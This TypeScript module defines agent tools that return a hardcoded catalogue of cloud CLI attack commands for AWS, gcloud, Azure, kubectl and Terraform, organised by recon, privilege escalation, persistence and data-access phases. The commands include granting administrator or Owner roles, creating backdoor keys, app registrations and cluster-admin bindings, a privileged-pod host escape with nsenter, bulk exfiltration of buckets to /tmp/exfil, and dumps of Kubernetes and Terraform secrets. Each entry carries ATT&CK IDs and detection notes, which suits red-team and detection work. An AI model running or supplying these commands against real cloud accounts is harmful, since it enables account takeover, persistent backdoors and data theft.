import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { Platform } from "../schema/unified-entry.js";

// ━━━ Helpers ━━━

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id, binary: e.binary, platform: e.platform, catalog: e.catalogSource,
    functions: e.functions, stealth_score: e.stealthScore, description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

// ━━━ Hardcoded Cloud CLI Abuse Data ━━━

interface CloudTechnique {
  phase: string;
  description: string;
  command: string;
  risk: string;
  attck: string[];
  detectionNotes: string;
}

interface CloudCli {
  name: string;
  binary: string;
  description: string;
  platforms: Platform[];
  techniques: CloudTechnique[];
}

const CLOUD_CLIS: Record<string, CloudCli> = {
  aws: {
    name: "AWS CLI",
    binary: "aws",
    description: "Amazon Web Services command-line interface for cloud resource management",
    platforms: ["linux", "macos", "windows"],
    techniques: [
      {
        phase: "recon", description: "Enumerate IAM users and roles",
        command: "aws iam list-users && aws iam list-roles",
        risk: "Reveals IAM structure for privilege escalation planning",
        attck: ["T1087.004"], detectionNotes: "CloudTrail: ListUsers, ListRoles API calls.",
      },
      {
        phase: "recon", description: "Enumerate S3 buckets and their ACLs",
        command: "aws s3 ls && aws s3api get-bucket-acl --bucket <BUCKET>",
        risk: "Identifies misconfigured or public buckets for data access",
        attck: ["T1580"], detectionNotes: "CloudTrail: ListBuckets, GetBucketAcl events.",
      },
      {
        phase: "privesc", description: "Attach admin policy to compromised user",
        command: "aws iam attach-user-policy --user-name <USER> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        risk: "Full account compromise via IAM privilege escalation",
        attck: ["T1098.001"], detectionNotes: "CloudTrail: AttachUserPolicy with AdministratorAccess.",
      },
      {
        phase: "persistence", description: "Create access key for backdoor access",
        command: "aws iam create-access-key --user-name <USER>",
        risk: "Persistent API access independent of password changes",
        attck: ["T1098.001"], detectionNotes: "CloudTrail: CreateAccessKey. Monitor for multiple active keys.",
      },
      {
        phase: "data_access", description: "Download S3 bucket contents",
        command: "aws s3 sync s3://<BUCKET> /tmp/exfil/ --quiet",
        risk: "Bulk data exfiltration from cloud storage",
        attck: ["T1530"], detectionNotes: "CloudTrail: GetObject events. Monitor large data transfers.",
      },
    ],
  },
  gcloud: {
    name: "Google Cloud CLI",
    binary: "gcloud",
    description: "Google Cloud Platform command-line tool for cloud resource management",
    platforms: ["linux", "macos", "windows"],
    techniques: [
      {
        phase: "recon", description: "Enumerate GCP projects and IAM bindings",
        command: "gcloud projects list && gcloud projects get-iam-policy <PROJECT>",
        risk: "Reveals project structure and IAM bindings for privesc",
        attck: ["T1087.004"], detectionNotes: "Audit logs: projects.list, projects.getIamPolicy.",
      },
      {
        phase: "recon", description: "List compute instances and metadata",
        command: "gcloud compute instances list && gcloud compute instances describe <INSTANCE>",
        risk: "Identifies targets for lateral movement",
        attck: ["T1580"], detectionNotes: "Audit logs: compute.instances.list.",
      },
      {
        phase: "privesc", description: "Set IAM policy binding for service account impersonation",
        command: "gcloud iam service-accounts add-iam-policy-binding <SA> --member='user:<EMAIL>' --role='roles/iam.serviceAccountTokenCreator'",
        risk: "Impersonate service accounts for privilege escalation",
        attck: ["T1098.001"], detectionNotes: "Audit logs: SetIamPolicy on service accounts.",
      },
      {
        phase: "persistence", description: "Create service account key for persistent access",
        command: "gcloud iam service-accounts keys create key.json --iam-account=<SA>",
        risk: "Persistent API access via service account key",
        attck: ["T1098.001"], detectionNotes: "Audit logs: CreateServiceAccountKey.",
      },
      {
        phase: "data_access", description: "Download GCS bucket contents",
        command: "gsutil -m cp -r gs://<BUCKET>/ /tmp/exfil/",
        risk: "Bulk data exfiltration from cloud storage",
        attck: ["T1530"], detectionNotes: "Audit logs: storage.objects.get. Monitor egress.",
      },
    ],
  },
  az: {
    name: "Azure CLI",
    binary: "az",
    description: "Microsoft Azure command-line interface for cloud resource management",
    platforms: ["linux", "macos", "windows"],
    techniques: [
      {
        phase: "recon", description: "Enumerate Azure AD users and groups",
        command: "az ad user list && az ad group list",
        risk: "Reveals Azure AD directory structure",
        attck: ["T1087.004"], detectionNotes: "Azure AD audit logs: List users/groups operations.",
      },
      {
        phase: "recon", description: "List Azure subscriptions and resources",
        command: "az account list && az resource list",
        risk: "Maps Azure infrastructure for targeting",
        attck: ["T1580"], detectionNotes: "Activity logs: List subscriptions and resources.",
      },
      {
        phase: "privesc", description: "Assign Owner role to compromised identity",
        command: "az role assignment create --assignee <PRINCIPAL_ID> --role Owner --scope /subscriptions/<SUB_ID>",
        risk: "Full subscription access via role escalation",
        attck: ["T1098.001"], detectionNotes: "Activity logs: Create role assignment with Owner.",
      },
      {
        phase: "persistence", description: "Create app registration with credentials for backdoor",
        command: "az ad app create --display-name backdoor && az ad app credential reset --id <APP_ID>",
        risk: "Persistent access via app registration",
        attck: ["T1098.001"], detectionNotes: "Azure AD logs: App registration creation, credential reset.",
      },
      {
        phase: "data_access", description: "Download Azure blob storage",
        command: "az storage blob download-batch -d /tmp/exfil/ -s <CONTAINER> --account-name <ACCOUNT>",
        risk: "Bulk data exfiltration from blob storage",
        attck: ["T1530"], detectionNotes: "Storage logs: GetBlob events. Monitor data egress.",
      },
    ],
  },
  kubectl: {
    name: "kubectl",
    binary: "kubectl",
    description: "Kubernetes CLI for cluster management, often abused for lateral movement and data access",
    platforms: ["linux", "macos", "windows"],
    techniques: [
      {
        phase: "recon", description: "Enumerate cluster resources, namespaces, and secrets",
        command: "kubectl get namespaces && kubectl get pods --all-namespaces && kubectl get secrets --all-namespaces",
        risk: "Reveals cluster structure, running workloads, and secrets",
        attck: ["T1613"], detectionNotes: "K8s audit logs: list pods, secrets across namespaces.",
      },
      {
        phase: "privesc", description: "Create privileged pod for node access",
        command: "kubectl run privpod --image=alpine --restart=Never --overrides='{\"spec\":{\"hostPID\":true,\"hostNetwork\":true,\"containers\":[{\"name\":\"c\",\"image\":\"alpine\",\"securityContext\":{\"privileged\":true},\"command\":[\"nsenter\",\"--target\",\"1\",\"--mount\",\"--uts\",\"--ipc\",\"--net\",\"--pid\",\"--\",\"bash\"]}]}}'",
        risk: "Escape to host node via privileged container",
        attck: ["T1611"], detectionNotes: "Audit logs: create pod with privileged securityContext.",
      },
      {
        phase: "persistence", description: "Create cluster role binding for persistent admin access",
        command: "kubectl create clusterrolebinding backdoor --clusterrole=cluster-admin --user=<USER>",
        risk: "Persistent cluster-admin access",
        attck: ["T1098"], detectionNotes: "Audit logs: create ClusterRoleBinding with cluster-admin.",
      },
      {
        phase: "data_access", description: "Extract secrets and config maps",
        command: "kubectl get secret <SECRET> -o jsonpath='{.data}' | base64 -d",
        risk: "Access credentials, API keys, and sensitive configuration",
        attck: ["T1552.007"], detectionNotes: "Audit logs: get secrets with data exposure.",
      },
    ],
  },
  terraform: {
    name: "Terraform CLI",
    binary: "terraform",
    description: "Infrastructure as Code tool that can be abused for resource manipulation and backdoor provisioning",
    platforms: ["linux", "macos", "windows"],
    techniques: [
      {
        phase: "recon", description: "Read Terraform state for infrastructure mapping",
        command: "terraform state list && terraform state show <RESOURCE>",
        risk: "State file contains all resource details including secrets",
        attck: ["T1580"], detectionNotes: "Monitor access to terraform.tfstate files.",
      },
      {
        phase: "privesc", description: "Modify IAM resources via Terraform to escalate privileges",
        command: "terraform apply -target=aws_iam_user_policy_attachment.admin",
        risk: "Infrastructure-level privilege escalation via IaC",
        attck: ["T1098.001"], detectionNotes: "CloudTrail: resource changes matching Terraform patterns.",
      },
      {
        phase: "persistence", description: "Add backdoor resources via Terraform configuration",
        command: "terraform apply  # with added backdoor resource blocks in .tf files",
        risk: "Persistent infrastructure backdoors managed as code",
        attck: ["T1098"], detectionNotes: "Review .tf file changes. Monitor terraform plan/apply.",
      },
      {
        phase: "data_access", description: "Extract secrets from Terraform state file",
        command: "terraform state pull | python3 -c \"import sys,json; [print(r) for r in json.load(sys.stdin)['resources']]\"",
        risk: "State file may contain database passwords, API keys, etc.",
        attck: ["T1552"], detectionNotes: "Monitor terraform state pull commands. Protect state files.",
      },
    ],
  },
};

// ━━━ Tool Factory ━━━

function makeCloudTool(cliKey: string, cli: CloudCli): ToolDef {
  const toolName = cliKey === "az" ? "cloud_az_cli" : `cloud_${cliKey}`;
  return {
    name: toolName,
    description: `Find ${cli.name} abuse techniques for cloud reconnaissance, privilege escalation, persistence, and data access`,
    schema: {
      phase: z.enum(["recon", "privesc", "persistence", "data_access", "all"]).default("all")
        .describe("Attack phase to filter techniques by"),
    },
    async execute(args: { phase?: string }, ctx: ToolContext): Promise<ToolResult> {
      const phase = args.phase || "all";
      let techniques = cli.techniques;

      if (phase !== "all") {
        techniques = techniques.filter(t => t.phase === phase);
      }

      // Search KB for the CLI binary
      const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword(cli.binary));

      return json({
        cli: cli.name,
        binary: cli.binary,
        platforms: cli.platforms,
        phase_filter: phase,
        total_techniques: techniques.length,
        techniques: techniques.map(t => ({
          phase: t.phase,
          description: t.description,
          command: t.command,
          risk: t.risk,
          attck: t.attck,
          detection_notes: t.detectionNotes,
        })),
        kb_matches: kbEntries.slice(0, 10).map(summarizeKbEntry),
        total_kb_matches: kbEntries.length,
      });
    },
  };
}

// ━━━ Tools ━━━

const cloud_aws_cli = makeCloudTool("aws", CLOUD_CLIS.aws);
const cloud_gcloud = makeCloudTool("gcloud", CLOUD_CLIS.gcloud);
const cloud_az_cli = makeCloudTool("az", CLOUD_CLIS.az);
const cloud_kubectl = makeCloudTool("kubectl", CLOUD_CLIS.kubectl);
const cloud_terraform = makeCloudTool("terraform", CLOUD_CLIS.terraform);

export const cloudAbuseTools: ToolDef[] = [
  cloud_aws_cli,
  cloud_gcloud,
  cloud_az_cli,
  cloud_kubectl,
  cloud_terraform,
];
